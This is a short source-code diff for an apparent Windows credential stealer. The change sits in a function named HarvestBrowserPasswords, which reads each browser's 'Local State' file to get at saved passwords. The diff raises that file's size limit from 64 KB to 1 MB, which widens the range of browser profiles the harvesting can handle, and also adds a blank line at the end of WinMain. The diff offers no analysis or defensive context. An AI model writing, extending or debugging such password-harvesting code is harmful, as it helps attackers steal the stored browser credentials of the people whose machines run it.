@@ -1042,7 +1042,7 @@ static void HarvestBrowserPasswords() {
         HANDLE hLs = CreateFileA(lsPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
         if (hLs == INVALID_HANDLE_VALUE) { LogMsg(bName + ": Local State not found"); Diag("Local State not found"); continue; }
         DWORD lsSize = GetFileSize(hLs, NULL);
-        if (lsSize > 65536) { CloseHandle(hLs); LogMsg(bName + ": Local State too large"); Diag("Local State too large"); continue; }
+        if (lsSize > 1048576) { CloseHandle(hLs); LogMsg(bName + ": Local State too large"); Diag("Local State too large"); continue; }
         std::string lsContent((size_t)lsSize, 0);
         DWORD rd = 0;
         if (!ReadFile(hLs, &lsContent[0], lsSize, &rd, NULL) || rd != lsSize) { CloseHandle(hLs); LogMsg(bName + ": Local State read failed"); Diag("Local State read failed"); continue; }
@@ -1757,6 +1757,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
     return 0;
 }
+
 
 
 
